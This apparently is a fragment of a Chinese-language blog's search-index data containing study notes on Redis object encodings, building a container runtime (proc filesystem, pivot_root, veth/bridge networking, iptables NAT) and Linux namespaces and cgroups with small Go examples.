embstr编码是一个用于保存短字符串的方法，其底层也是使用redisObject和sds实现的，但是只分配一次内存空间，且redisObject和sds为连续的空间，而不用为两个分别分配 使用 embstr 保存短字符串，有什么好处？ 只用分配一次内存 释放也只用一次就行 因为在一块连续的内存中，能更好的利用缓存 如果保存为 long doubule 类型的浮点数，在 Redis 中也是使用字符串来保存的。也就是，如果我们需要保存一个浮点数，那么会将其转为字符串值，再保存 redis&gt; SET pi 3.14 OK redis&gt; OBJECT ENCODING pi \"embstr\" 一定条件下，int编码的字符串对象和embstr 编码的字符串对象在条件满足的情况下，会被转换为raw编码的字符串对象 如： redis&gt; SET number 10086 OK redis&gt; OBJECT ENCODING number \"int\" redis&gt; APPEND number \" is a number\" (integer) 23 redis&gt; GET number \"10086 is a number\" redis&gt; OBJECT ENCODING number \"raw\" 另外，Redis没有为embstr 编码的字符串对象编写任何相应的修改程序（只有int和raw有），所以 embstr 编码的字符串实际上是只读。 所以对embstr编码的字符串对象的修改命令，都是先转换成raw，再执行，所以在对 embstr 编码的字符串对象执行修改命令后，都会变成一个 raw 编码的字符串对象 如： redis&gt; SET msg \"hello world\" OK redis&gt; OBJECT ENCODING msg \"embstr\" redis&gt; APPEND msg \" agein\" (integer) 18 redis&gt; OBJECT ENCODING msg \"raw\" 列表对象列表对象的编码可以是ziplist或者linkedlist 注意，linkedlist 编码的列表在底层的双端链表结构中包含了多个字符串对象，字符串对象是 Redis 五种类型的对象中唯一一种会被其它四种类型对象嵌套的对象 列表对象何时使用 ziplist 编码？ 列表对象保存的所有字符串元素的长度都小于64字节 保存的元素数量小于512个 注意：上面两个上限是可以修改的变量，list-max-ziplist-value和list-max-ziplist-entries redis&gt; RPUSH blah \"hello\" \"world\" \"again\" (integer) 3 redis&gt; OBJECT ENCODING blah \"ziplist\" # 将65字节长的放入 redis&gt; RPUSH blsh \"wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\" (integer) 4 redis&gt; OBJECT ENCODING blah \"linkedlist\" 哈希对象哈希对象的编码可以是 ziplist 或 hashtable 当使用 ziplist 实现时，有新键值对要加入哈希对象时，会先将键压缩至列表尾部，然后再将值放入 因此： 压缩列表的实现的哈希的键值对是紧挨在一起 先添加的就会在前面，后来的就在后面 当使用hashtable编码是现实时，其键值对都是一个字符串对象 何时为 ziplist 编码实现哈希对象？ 键值对的字符串长度都小于64字节 保存的键值对数量小于512个 当然，可以改变配置 hash-max-ziplist-value 和 hash-max-ziplist-entries redis&gt; HSET book name \"Mastering\" (integer) 1 redis&gt; OBJECT ENCODING book \"ziplist\" redis&gt; HSET book long_long_long_long_long_long_long_long_long_long_long_long_long_long_description \"content\" (integer) 1 redis&gt; OBJECT ENCODING book \"hashtable\" 集合对象集合对象的编码可以是intset或者 hashtable intset 编码的集合对象使用整数集合作为底层实现，集合对象包含的所有元素都被保存在整数集合里面 如： redis&gt; SADD number 1 3 5 (integer) 3 hashtable 编码实现时，字典的每个键都是一个字符串对象，每个字符串对象包含了一个集合元素，而字典的值则全部设为 NULL。因为 dict的table为多个entry，含有k v redis&gt; SADD Dfruits \"apple\" \"banana\" \"cherry\" (integer) 3 何时使用 intset 编码？ 集合对象保存的所有元素为整数值 保存元素数量不超过 512 个 注意：元素上限数量是可以改变的，set-max-intset-entries redis&gt; SADD numbers 1 3 5 (integer) 3 redis&gt; OBJECT ENCODING numbers \"intset\" redis&gt; SADD numbers \"seven\" (integer) 1 redis&gt; OBJECT ENCODING numbers \"hashtables\" 有序集合对象有序集合的编码可以是 ziplist 或者 skiplist ziplist 编码实现的有序集合，类似哈希。只是有序集合将成员（member）放在前面，分数（score）放在后面，而且有序集合的分值从小到大排，将分值小的放在表头，分值大的，放在表尾 skiplist编码的有序集合，使用zet结构作为底层实现，一个zet包含一个字典和一个跳跃表 typedef struct zset{ zskiplist *zsl; dict *dict; }zset; 为了什么有序集合需要同时使用跳表和字典？ 保证查找和排序时，都能有更好的性能。以空间换时间。并且字典和跳跃表会共享元素的成员和分值，所有不会造成数据重复，也不会浪费内存 何时使用 ziplist？ 有序集合保存的元素数量小于 128 个 长度都小于 64 字节 当然，以上条件可以使用 zset-max-ziplist-entries 和 zset-max-ziplist-value 进行修改 redis&gt; EVAL \"for i=1, 128 do redis.call('ZADD',KEYS[1],i,i) end\" 1 numbers (nil) redis&gt; ZCARD numbers (integer) 128 redis&gt; OBJECT ENCODING numbers \"ziplist\" redis&gt; ZADD numbers 3.14 pi (integer) 1 redis&gt; ZCARD numbers (integer) 129 redis&gt; OBJECT ENCODING numbers \"skiplist\" 类型检查Redis 的命令可以分为两种类型，一种是可以对任何类型的键执行，如：DEL、EXPRIRE、RENAME等；一种只能对特定类型的键执行，如：SET、HEDL、ZADD等 如何实现的类型检查？ 因为对特定类型的键执行时，肯定时需要做类型检查的，也就是对 redisObject 结构的 type 属性进行检查 如何实现多态命令？即根据值的对象，选择正确的编码方式 比如，我们执行 LLEN 命令时，无论对象为 ziplist，还是 linkedlist，都会使用对应 API 返回相应的结果。；类似 DEL、EXPIRE等和LLEN等命令，但前者是基于类型的多态，后者是基于编码的多态 内存回收Redis 的内存回收是引用技术实现的 typedef struct redisObject{ //... // 引用计数 int refcount; //... }robj; 计数信息如何变化？ 在创建一个新对象时，会被初始化为1 在被一个新程序使用时，会+1，不再被引用时，会-1 变为0时，会被释放掉 对象共享对于redisObject，如果多个键指向的值都是一样的，那么都会指向同一个值对象。而没多一个引用，refcount就会+1 一般来说，redis初始化时，会创建一万个字符串对象，包含 0~9999的所有整数。因此，当服务器需要使用时，便会直接引用，而不需要再创建 注意：这个数量可以通过 redis.h/REDIS_SHARED_INTEGERS 常量来进行修改 redis&gt; SET A 100 OK redis&gt; OBJECT REFCOUNT A (integer) 2 redis&gt; SET B 100 OK redis&gt; OBJECT REFCOUNT A (integer) 3 redis&gt; OBJECT REFCOUNT B (integer) 3 注意：这些共享并不是只有字符串键可以使用，而只要在数据结构中嵌套了字符串对象（如：linkedlist的列表对象、hashtable编码的集合对象都行） 为什么 Redis 不共享包含字符串的对象？即 raw或embstr 因为在共享时，需要验证该内容是否完全一样，那么如果该结构越复杂，验证共享对象和目前对象的复杂度就会越高，进行消耗的CPU时间也会越多。如果是整数值的，那么验证操作的复杂度为O(1)；如果是字符串值得，那么复杂度就会为O(n) 对象空转时长前面介绍了 redisObject 的四个属性为 type、encoding、ptr 和 refcount 。那么还存在最后一个属性，即 lru，记录 对象最后一次被命令程序访问的时间 typedef struct redisObject{ // 类型 unsigned type:4; // 强制占4位 // 编码 unsigned encoding:4; // 指向底层实现数据结构的指针 void *ptr; int refcount; unsigned lru:22; } OBJECT IDLETIME 命令打印出其空转时长，而这一空转时长是通过将当前时间减去键的值对象的lru时间得出的 redis&gt; SET msg \"hello world\" OK # 等待一段时间 redis&gt; OBJECT IDLETIME msg (integer) 20 redis&gt; GET msg \"hello world\" redis&gt; OBJECT IDLETIME msg ()","categories":[{"name":"redis","slug":"redis","permalink":"https://github.com/z-anshun/categories/redis/"}],"tags":[{"name":"books","slug":"books","permalink":"https://github.com/z-anshun/tags/books/"},{"name":"redis设计与实现","slug":"redis设计与实现","permalink":"https://github.com/z-anshun/tags/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"}]},{"title":"构造容器和镜像实现原理","slug":"构造容器和镜像","date":"2022-03-26T14:55:02.000Z","updated":"2022-03-26T14:59:27.789Z","comments":true,"path":"2022/03/26/gou-zao-rong-qi-he-jing-xiang/","link":"","permalink":"https://github.com/z-anshun/2022/03/26/gou-zao-rong-qi-he-jing-xiang/","excerpt":"","text":"构造实现Linux proc 文件系统首先，Linux 下的 /proc 文件系统 是由内核提供的，它并不是一个真正的文件系统，只包含了运行时的信息（如：系统内存、挂载信息、一些硬件设备等），因此它只存在于内存中，而不占用外存空间。以文件系统的形式，为访问内核的数据提供接口，如：lsmod（显示已载入系统的模块），实质就是cat /proc/modules 当你遍历这个目录时，即执行ls /proc/时，会发现很多数字，这些就是进程PID 还有一些文件，这里将几个重要的 /proc/N：PID为N的进程信息 /proc/N/cmdline：进程启动的命令 /proc/N/cwd：链接到进程当前工作目录 /proc/N/exe：链接到进程的执行命令文件 /proc/N/environ：进程环境变量列表 /proc/N/fd：包含进程相关的所有文件描述符 /proc/N/maps：与进程相关的内存映射信息 /proc/N/mem：指代进程持有的内存，不可读 /proc/N/root：链接到进程的根目录 /proc/N/stat：进程的状态 /proc/N/statm：进程使用的内存状态 /proc/N/status：进程状态信息，比 stat/statm 更具可读性 /proc/self/：链接到当前正在运行的进程，不同的进程访问该目录时获得的信息是不同的，等价于/proc/N 这里的N为当前进程的ID 实现run代码实现：Github 具体思路： 使用/proc/self/exe启动子进程，对当前进程进行初始化 然后调用 syscall.Exec()覆盖当前进程,并且使用 mount -t proc -o noexec,nosuid,nodev proc /proc挂载进程信息，使用 init进程（即子进程）不为1，并且挂载aufs，mount -t aufs -o dir=/root/writeLayer/${containerName}:/root/${imageName} nonw /root/mnt。 在资源限制方面，使用 /proc/self/mountinfo 的信息，获取到挂载资源限制的目录，如/sys/fs/cgroup/memory，然后创建文件，写入对应的信息，如memory.limit_in_bytes， 将进程加入创建好的 hierarchy，即对应目录下的tasks文件 注意：在运行时传入参数的时候，使用pipe，对参数进行传递，防止参数过多 构造镜像查看 docker 创建镜像后生成的文件$ docker pull busybox $ docker run -d busybox top -b $ docker export -o busybox.tar 7719 # 容器ID $ tar -xvf busybox.tar -C busybox/ $ ll busybox/ 总用量 56 drwxr-xr-x 12 root root 4096 3月 16 14:47 ./ drwxr-xr-x 5 root root 4096 3月 16 14:47 ../ drwxr-xr-x 2 root root 12288 3月 11 07:59 bin/ drwxr-xr-x 4 root root 4096 3月 16 14:46 dev/ -rwxr-xr-x 1 root root 0 3月 16 14:46 .dockerenv* drwxr-xr-x 3 root root 4096 3月 16 14:46 etc/ drwxr-xr-x 2 nobody nogroup 4096 3月 11 07:59 home/ drwxr-xr-x 2 root root 4096 3月 16 14:46 proc/ drwx------ 2 root root 4096 3月 11 07:59 root/ drwxr-xr-x 2 root root 4096 3月 16 14:46 sys/ drwxrwxrwt 2 root root 4096 3月 11 07:59 tmp/ drwxr-xr-x 3 root root 4096 3月 11 07:59 usr/ drwxr-xr-x 4 root root 4096 3月 11 07:59 var/ pivot_root 用法：pivot new_root put_old 一个系统调用，其主要功能为改变当前的root文件系统。将当前进程的 root 文件系统移动到 put_old 文件夹中，然后使 new_root 成为新的 root 文件系统。并且 new_root 和 put_old 必须不能在同一个mount namespace pivot_root 和 chroot 的主要区别： pivot_root：是将整个系统切换到一个新得root 目录，并且移除之前 root 文件系统的依赖。这样就能umount 原先的 root 文件系统 chroot：针对某个进程，而系统的其他部分依旧运行于老的root目录中 代码实现： if err := syscall.PivotRoot(root, pivotDir); err != nil { return fmt.Errorf(\"pivot_root %v\", err) } exec使用/proc/$$/ns，但是必须是单线程执行才行，也就是Go不行，这里使用CGo实现即可 log将输出至var/run/copyDocker/${containerName}/container.log即可 Stop根据var/run/copyDocker/${containerName}/config.json拿到对应的PID， 然后执行syscall.Kill(pidInt, syscall.SIGTERM) 容器网络网络虚拟化技术Linux实际上是通过网络设备去操作和使用网卡的，在系统装了一个网卡后，会为其生成一个网络设备的实例，如 eth0。而随着网络虚拟化技术的发展，Linux支持创建出虚拟化设备的组合实现多种多样的功能和网络拓扑。常见的虚拟化设备有Veth、Bridge、TAP等 Linux Veth Veth为对出现的虚拟网络设备，发送到其一段的请求，会从另一端发出。因此，在容器虚拟化场景中，会使用 Veth 连接不同的网络 Namespace 代码实现： # 1. 创建两个网络 Namespace $ ip netns add n1 $ ip netns add n2 # 2. 创建一对 Veth-pair veth0 veth1 # 缩写为 ip l a veth0 type veth peer name veth1 $ ip link add veth0 type veth peer name veth1 # 3. 将两个 veth0 veth1 加入两个 ns # ip link set veth0 netns n1 $ ip l s veth0 netns n1 $ ip l s veth1 netns n2 # 4. 给两个veth0 veth1 配上IP 并启用 $ ip netns exec ns1 ip a a 10.1.1.2/24 dev veth0 # ip addr add ${ip} dev ${eth0} $ ip netns exec ns2 ip a a 10.1.1.3/24 dev veth1 $ ip netns exec ns1 ip l s veth0 up # ip link set eth0 up 开启网卡 $ ip netns exec ns2 ip l s veth1 up # 从 veth0 ping到 veth1 $ ip netns exec ns1 ping 10.1.1.3 PING 10.1.1.3 (10.1.1.3) 56(84) bytes of data. 64 bytes from 10.1.1.3: icmp_seq=1 ttl=64 time=0.073 ms 64 bytes from 10.1.1.3: icmp_seq=2 ttl=64 time=0.068 ms --- 10.1.1.3 ping statistics --- 15 packets transmitted, 15 received, 0% packet loss, time 14000ms rtt min/avg/max/mdev = 0.068/0.084/0.201/0.032 ms Linux Bridge 用来桥接网络设备，类似于现实中的交换机，可以连接不同的网络设备，当请求到达Bridge设备时，可以通过报文中的MAC地址进行广播或者转发。 比如，创建一个Bridge设备，来连接Namespace中的网络设备和宿主机上的网络 # 1. 创建 bridge br0 $ ip l a br0 type bridge $ ip l s br0 up # 2. 创建两对 veth-pair $ ip l a veth0 type veth peer name br-veth0 $ ip l a veth1 type veth peer name br-veth1 # 3. 分别将两对 veth-pair 加入两个 ns 和 br0 $ ip l s veth0 netns n1 $ ip l s br-veth0 master br0 $ ip l s br-veth0 up $ ip l s veth1 netns n2 $ ip l s br-veth1 master br0 $ ip l s br-veth1 up # 4. 给两个 ns 中的 veth 配置 IP 并启用 $ ip netns exec ns1 ip a a 10.1.1.2/24 dev veth0 $ ip nesns exec ns1 ip l s veth0 up $ ip netns exec ns2 ip a a 10.1.1.3/24 dev veth1 $ ip netns exec ns2 ip l s veth1 up # 5. veth0 ping veth1 $ ip netns exec ns1 ping 10.1.1.3 PING 10.1.1.3 (10.1.1.3) 56(84) bytes of data. 64 bytes from 10.1.1.3: icmp_seq=1 ttl=64 time=0.060 ms 64 bytes from 10.1.1.3: icmp_seq=2 ttl=64 time=0.105 ms --- 10.1.1.3 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 999ms rtt min/avg/max/mdev = 0.060/0.082/0.105/0.024 ms Linux 路由表通过定义路由表来决定某个NS中包的流向，从而定义请求会走到哪个网络上 接着上面的继续执行 $ ip l s br0 up $ ip l s veth0 up $ ip netns exec ns1 ip a a 10.1.1.3/24 dev veth1 $ ip netns exec ns1 ip l s veth1 up # 分别设置ns1网络空间的路由和宿主机上的路由 # default 代表 0.0.0.0/0,即在 Net Namescape 中所有的流量都经过veth1的网络设备流出 $ ip netns exec ns1 route add default dev veth1 # 在宿主机上将10.1.0.0/24的网段设置到br0的网桥 $ route add -net 10.1.0.0/24 dev br0 从而实现了对IP的请求到对应的网络设备上，即实现了Namespace和宿主机的互相通信 Linux iptablesiptables为对Linux内核的netfilter模块进行操作和展示的工具，用来管理包的流动和转送 其定义了一套链式结构，在网络包传输的各个阶段使用不同的策略对包进行加工、传送或丢弃。 在容器虚拟化的技术中，经常会用到两种策略 MASQUERADE 和 DNAT，用于容器和宿主机外部的网络通信 MYSQUERADE 将请求包的源地址转换成一个网络设备的地址 比如：在Namespace中的网络设备，虽然能通过Bridge访问宿主机，但是当它访问外部时，路由是不知道Namespace的IP的，所有需要使用MYSQUERADE将其原IP转为宿主机出口网卡的IP # 打开IP转发 $ sysctl -w net.ipv4.conf.all.forwarding=1 net.ipv6.conf.all.foewarding=1 # 对 NS 中发出的包添加网络地址转换 $ iptables -t nat -A POSTROUTING -s 10.1.0.0/24 -o eth0 -j MYSQUERADE DNAT DNAT策略也是做网络地址的转换，但是它要转换的是目标地址，因此，常用于将内部网络地址的端口映射到外部去。 比如，将上面的NS需要提供服务给宿主机之外的应用，而外部是无法直接访问NS的ip地址的，这个时候就需要使用 DNAT 策略 # 将到宿主机上 80 端口的请求转发到 NS 的IP上 $ iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.1.2/24:80 这样就将宿主机上的80端口的请求转发到了NS的中10.1.1.2/24:80上","categories":[{"name":"手搓docker","slug":"手搓docker","permalink":"https://github.com/z-anshun/categories/%E6%89%8B%E6%90%93docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://github.com/z-anshun/tags/docker/"},{"name":"books","slug":"books","permalink":"https://github.com/z-anshun/tags/books/"}]},{"title":"基础技术","slug":"基础技术","date":"2022-03-10T10:12:37.000Z","updated":"2022-03-13T11:22:31.123Z","comments":true,"path":"2022/03/10/ji-chu-ji-zhu/","link":"","permalink":"https://github.com/z-anshun/2022/03/10/ji-chu-ji-zhu/","excerpt":"","text":"Docker 什么是docker？ 一个开源工具，将应用打包为镜像，并以容器方式运行 Docker 容器具有下面三个特点： 轻量级：共享内核，并且因为镜像以分层文件系统构造，这使得它们可以共享相同的文件，使得磁盘使用率和镜像下载速度都提高 开放： 安全：隔离 Linux Namespace概念Linux Namespace 是 Kernel 的一个功能，它可以隔离一系列的系统资源，比如：PID、User ID、Network、进程资源等。既然包括了进程资源，也就是进程数、网络接口等，这里就不能使用chroot实现了（把根目录换成指定的目的目录） 当前 Linux 实现的 6 种 Namespace Namespace类型 系统调用参数 内核版本 Mount Namespace CLONE_NEWNS 2.4.19 UTS Namespcae CLONE_NEWUTS 2.6.19 IPC Namespace CLONE_NEWIPC 2.6.19 PID Namespcae CLONE_NEWPID 2.6.24 Network Namespace CLONE_NEWNET 2.6.29 User Namespace CLONE_NEWUSER 3.8 Namespace 的 API 主要使用下面3个系统调用： clone()：创建新进程，根据系统调用参数来判断哪些类型的 Namespace 被创建，而且它们的子进程也会被包含到这些 Namespace 中 unshare()：将进程移除某个 Namespace setns()：将进程加入到 Namespace UTS NamespaceUNIX Time-sharing System 允许每个容器拥有独立的 hostname 和domain name，使其在网络上可被视作一个独立的节点而非主机上的一个进程 简单的代码实现： package main import ( \"os/exec\" \"syscall\" \"os\" \"log\" ) func main() { // 指定被 fork 出来的新进程内的初始命令 cmd:=exec.Command(\"sh\") // 设置参数系统，使用标识去创建一个 UTS Namespace。并且 GO 封装了对 clone() 函数的调用 cmd.SysProcAttr = &amp;syscall.SysProcAttr{ Cloneflags: syscall.CLONE_NEWUTS, } cmd.Stdin = os.Stdin cmd.Stdout = os.Stdout cmd.Stderr = os.Stderr if err := cmd.Run(); err!=nil{ log.Fatal(err) } } 启动后，验证父子进程不在同一个UST Namespace： 使用pstree -pl查看父子进程的ID，然后使用readlink /proc/$PID/ns/uts验证得到父子进程不在同一个UTS Namespace 修改当前启动的sh的hostname（hostname -b $name），也不会影响外部 IPC Namespace用来隔离 System V IPC 和 POSIX message queues。每一个 IPC Namespace 都有自己的 System V IPC 和 POSIX message queue 代码实现： package main import ( \"os/exec\" \"syscall\" \"os\" \"log\" ) func main() { // 指定被 fork 出来的新进程内的初始命令 cmd:=exec.Command(\"sh\") cmd.SysProcAttr = &amp;syscall.SysProcAttr{ Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWIPC, } cmd.Stdin = os.Stdin cmd.Stdout = os.Stdout cmd.Stderr = os.Stderr if err := cmd.Run(); err!=nil{ log.Fatal(err) } } 相当于，现在多加了一个标识，表示我们希望创建 IPC Namespace 验证： 首先，在主机，使用ipcs查看，然后ipcmk创建消息队列，然后启动，发现新创建的sh中，查找不到该消息队列，即实现 IPC 命令空间隔离 PID Namespace隔离进程 ID，即同一个进程在不同的 PID Namespace 里可以拥有不同的 PID。换句话说，就是在容器内外查看同一个进程的 ID不同，比如，容器内 PID为1，但是在容器外，却不一样。 代码实现：添加 syscall.CLONE_NEWPID标识即可 package main import ( \"os/exec\" \"syscall\" \"os\" \"log\" ) func main() { // 指定被 fork 出来的新进程内的初始命令 cmd:=exec.Command(\"sh\") cmd.SysProcAttr = &amp;syscall.SysProcAttr{ Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWIPC | syscall.CLONE_NEWPID, } cmd.Stdin = os.Stdin cmd.Stdout = os.Stdout cmd.Stderr = os.Stderr if err := cmd.Run(); err!=nil{ log.Fatal(err) } } 验证： 首先，运行Go文件，执行echo $$打印出当前 PID 为 1， 然后，在外部使用 pstree -pl 查看进程树。发现 GO 对应的进程不为 1，也就是在容器内外的 PID不同，实现了 PID Namespace Mount Namespace隔离各进程看到的挂载点视图，即在不同容器中看到的文件系统层次是不同的。而且，在不同的容器中调用mount()和unmount只会影响当前文件系统，不会影响到其它，或者全局。 为什么 Mount Namespace 的调用参数为 CLONE_NEWNS，而不是跟其它一样，如 CLONE_NEWPID? 因为它是Linux实现的第一个Namespace，因此为 NEWNS（New Namespace缩写）。而且当时没并未想到后面还有许多 Namespace加入 代码实现，跟上面类似： package main import ( \"os/exec\" \"syscall\" \"os\" \"log\" ) func main() { // 指定被 fork 出来的新进程内的初始命令 cmd:=exec.Command(\"sh\") cmd.SysProcAttr = &amp;syscall.SysProcAttr{ Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWIPC | syscall.CLONE_NEWPID | syscall.CLONE_NEWNS, } cmd.Stdin = os.Stdin cmd.Stdout = os.Stdout cmd.Stderr = os.Stderr if err := cmd.Run(); err!=nil{ log.Fatal(err) } os.Exit(-1) } 验证： 运行代码，执行ls /proc查看内核和内核模块的信息。 然后，执行mount -t proc proc /proc，即使讲当前 Namespace 的 proc挂载到 /proc， 接着，执行ls /proc，跟一开始的信息不同，因为一开始未挂载，看的还是宿主机的，而现在挂载后，看到就是 Namespace 里的 最后，执行ps -ef，看到sh进程的ID为1，即与外部实现隔离，mount并没有影响到外部（ps命令会使用/proc 下的内容） User Namespace隔离用户的用户组ID。也就是一个进程的 User ID 和 Group ID在User Namespace 内外是不同的。较为常用的就是宿主机上一个非 root 用户运行创建一个 User Namespace，然后在User Namespace 里却映射为 root 用户。 也就是说，该进程在 User Namespace中有root权限，但在外面却没有root权限。 从 Linux Kernel3.8 开始，非root进程也可以创建 User Namespace。 代码实现： package main import ( \"os/exec\" \"syscall\" \"os\" \"log\" ) func main() { // 指定被 fork 出来的新进程内的初始命令 cmd:=exec.Command(\"sh\") cmd.SysProcAttr = &amp;syscall.SysProcAttr{ Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWIPC | syscall.CLONE_NEWPID | syscall.CLONE_NEWNS | syscall.CLONE_NEWUSER, } cmd.SysProcAttr.Credential = &amp;syscall.Credential{Uid:uint32(1),Gid:uint32(1)} cmd.Stdin = os.Stdin cmd.Stdout = os.Stdout cmd.Stderr = os.Stderr if err := cmd.Run(); err!=nil{ log.Fatal(err) } } 验证： 首先，使用 id 查看当前是否为 root 用户，然后运行go run main.go 然后，执行id 查看 Namespace 中的信息，其UID跟刚才不同，即证明User Namespace 生效 Network Namespace用来隔离网络设备、IP 地址端口等网络栈的Namespace。 使每个容易拥有自己的网络设备（虚拟），而且容器内可以进行端口绑定，每个Namespace中也不会冲突（即不同容器之间可以使用相同的端口） 代码实现： func main() { // 指定被 fork 出来的新进程内的初始命令 cmd:=exec.Command(\"sh\") cmd.SysProcAttr = &amp;syscall.SysProcAttr{ Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWIPC | syscall.CLONE_NEWPID | syscall.CLONE_NEWNS | syscall.CLONE_NEWUSER | syscall.CLONE_NEWNET, } cmd.SysProcAttr.Credential = &amp;syscall.Credential{Uid:uint32(1),Gid:uint32(1)} cmd.Stdin = os.Stdin cmd.Stdout = os.Stdout cmd.Stderr = os.Stderr if err := cmd.Run(); err!=nil{ log.Fatal(err) } } 首先，使用ifconfig查看当前的网络设备，发现有lo、eth0、eth1等 然后，go run main.go，再在Namespace中运行ifconfig，查看什么网络设备都没有（因为这里并没有配置网桥） Linux Cgroups控制组，确保每个容器所占有的资源，这样确保了当容器内的资源使用产生压力时不会连累主机系统。也就能预防 DOOS攻击 Cgroups 中的三个组件： cgroup：一种对进程分组管理的机制，一个cgroup就包含了一组进程，并且可以对其配置 Linux subsystem 的各种参数配置，即讲一组进程和一组 subsystem 的系统参数关联起来 subsystem：一组资源控制的板块，包含如下几项: blkio：设置对块设备（比如硬盘）输入输出的访问控制 cpu：设置cgroup中进程的 CPU 被调度的策略 cpuacct：可以统计 cgroup 中进程的CPU占用 cpuset：在多核机器上设置 cgroup 中进程可以使用的 CPU 和内存（此处内存仅用于 NUMA 架构（Non-Uniform Memory Access，非均匀内存访问架构）） devices：控制 cgroup 中进程的 CPU 占用 freezer：用于挂起（suspend）和恢复（resume）cgroup中的进程 memory：用于控制 cgroup 中进程的内存占用 net_cls：用于将 cgroup 中进程产生的网络包分类，以便 Linux 的 tc（traffic controller）可以根据分类区分出来自某个 cgroup 的包并做限制和监控 net_prio：设置 cgroup 中进程产生的网络流量的优先级 ns：管理 cgroup 中创建的 Namespace 中的新的 cgroup 也就是每个 subsystem 会关联到定义了相应限制的 cgroup 上，并对这个 cgroup 中的进程做相应的限制和控制 如何查看当前内核支持哪些 subsystem ？ 首先，安装 cgroup （apt-get install cgroup-bin）,然后通过 lssubsys 进行查看（lssubsys -a） hierarchy：把一组 cgroup 串成一个树状的结构，一个这样的树，便是一个 hierarchy（等级制度）。通过这种树状结构，Cgroups 可以做到继承。如：系统对一组定时的任务进程通过 cgroup1 限制了 CPU的利用率，然后其中有个定时 dump 日志的进程还需要限制磁盘 IO，为了避免影响到之后的其它进程，就需要创建 cgroup2，使其继承 cgroup1 的限制CPU，而不基础限制 磁盘IO 三个组件的相互关系 很明显 Cgroups 是依靠着三个组件相互协作实现的，那么三个组件的关系是什么？ 一个系统在创建了 hierarchy 之后，系统的所有进程都会加入这个 hierarchy 的 cgroup 根节点（hierarchy 默认创建的） 一个 subsystem 只能赋值到一个 hierarchy 上 一个 hierarchy 上可以被赋值多个 subsystem 一个进程可以作为多个 cgroup 的成员，但是这些 cgroup 必须在不同的 hierarchy 上 当一个进程 fork 一个子进程后，子进程默认跟父进程在同一个 cgroup，但是也可以不同 Kernel 接口我们要配置 Cgroups，需要调用 Kernel 的接口才行。为了使其 Cgroups的配置更直观，是通过一个虚拟的树状文件系统配置 Cgroups 的，通过层级的目录虚拟出 cgroup 树 创建并挂载一个 hierarchy（cgroup树） mkdir cgroup-test # 创建挂载点 sudo mount -t cgroup -o none,name=cgroup-test cgroup-test ./cgroup-test # 挂载一个hierarchy ls ./cgroup-test # 输出根节点的配置 # 输出：cgroup.clone_children cgroup.procs cgroup.sane _behavior notify_on_release release_agent tasks cgroup.clone_children：cpuset（进程使用CPU和内存）的 subsystem 会读取这个配置文件，如果这个值是1（默认是0），子cgroup就会继承父的 cpuset 配置 cgroup.procs：树中当前节点 cgroup 中的进程组ID，当前为根节点，即文件中会有现在系统中所有进程组的ID notify_on_release 和 release_agent 会一起使用。notify_on_release标识当前的cgroup中的最后一个进程退出后，是否执行 release_agent。release_agent则是一个路径，会执行其对应的文件，通常用来清理不再使用的 cgroup tasks：标识该 cgroup 下的进程 ID，如果把一个进程ID写到 tasks 写到文件中，便会使相应的进程加入到对应的 cgroup中 在刚刚创建好的 hierarchy 上扩展两个子 cgroup cd cgroup-test sudo mkdir cgroup-1 # 创建子 cgroup 'cgroup-1' sudo mkdir cgroup-2 # 创建子 cgroup 'cgroup-2' tree # 输出： :&lt;&lt;eof . |-- cgroup-1 | |-- cgroup.clone_children | |-- cgroup.procs | |-- notify_on_release | ‘ -- tasks |-- cgroup-2 | |-- cgroup.clone_children | |-- cgroup.procs | |-- notify_on_release | ‘ -- tasks |-- cgroup.clone_children |-- cgroup.procs |-- notify_on_release |-- release_agent ‘ -- tasks eof 在 cgroup 中添加和移动进程 一个进程在 hierarchy 树上，只能在一个 cgroup 节点上。默认都在根节点。若要移动到其它节点，将其进程 ID 移动到对应 cgroup 节点的 tasks 文件中即可 [cgroup-1] echo $$ 462 [cgroup-1] sudo sh -c \"echo $$ &gt;&gt; tasks\" # 将在终端的进程移动到 cgroup-1 [cgroup-1] cat /proc/462/cgroup 13:name=cgroup-test:/cgroup-1 11:perf_event:/ 10:cpu,cpuacct:/user.slice 9:freezer:/ 8:blkio:/user.slice 7:devices:/user.slice 6:cpuset:/ S:hugetlb:/ 4:pids:/user.slice/user-1000.slice 3:memory:/user.slice 2:net_cls,net_prio:/ l:name=systemd:/user.slice/user-1000.slice/session-19.scope 可以看到该进程被加入了 cgroup-test:/cgroup-1 通过 subsystem 管理 cgroup 中进程的资源 系统为每个 subsystem 创建了一个默认的 hierarchy。如 memory 的 hierarchy mount | grep memory cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory,nsroot=/) 这里，/sys/fs/cgroup/memory 目录便挂在了 memory subsystem 的 hierarchy 上。下面，通过这个 hierarchy 创建 cgroup，进而限制进程占用的内存 [memory] stress -vm-bytes 200m --vm-keep -m 1 # 在不限制的情况下，启动一个占用内存的stress内存 [memory] sudo mkdir test-limit-memory &amp;&amp; cd test-limit-memory # 创建一个 cgroup [memory] sudo sh -c \"echo \"100m\" &gt; memory.limit_in_bytes\" # 设置最大 cgroup 的最大内存占用用100MB [memory] sudo sh -c \"echo $$ &gt; tasks\" # 将当前进程移动到这个cgroup中 [memory] stress --vm-bytes 200m --vm-keep -m 1 # 再次尝试占用200MB的进程 [memory] top ＃限制后内存占用约100MB (2GB*5%） PID PPID TIME+ %CPU %MEM PR NI S VIRT RES UID COMMAND 8310 8309 0:01.17 7.6 5.0 20 0 R 212284 102056 1000 stress 8309 7475 0:00.00 0.0 0.0 20 0 S 7480 796 1000 stress Docker 使用 GroupsDocker 通过 Groups 实现容器资源限制和监控 # docker run -m 设置内存 sudo docker run -itd -m 128m ubuntu #输出：957459145e9092618837cf94alcb356e206f2f0da560b40cb31035e442d3dfll # docker 会为每个容器在系统的 hierarchy 中创建 cgroup cd /sys/fs/cgroup/memory/docker/{{刚刚生成的docker}} 